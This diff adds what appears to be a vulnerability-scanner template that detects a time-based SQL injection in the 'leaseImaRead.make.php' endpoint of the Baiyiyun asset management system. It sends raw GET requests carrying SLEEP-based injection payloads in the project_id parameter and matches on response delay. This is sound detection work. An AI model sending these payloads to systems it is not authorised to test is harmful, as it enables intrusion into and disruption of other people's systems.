@@ -1,0 +1,32 @@
+id: baiyiyun-leaseimaread-make-sqli
+
+info:
+  name: "百易云资产管理运营系统 leaseImaRead.make 接口 SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 百易云
+
+http:
+  - raw:
+      - |
+        GET /adminx/leaseImaRead.make.php?act=make&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))xxxx) HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /adminx/leaseImaRead.make.php?act=make&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(8)))xxxx) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "生成成功"
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
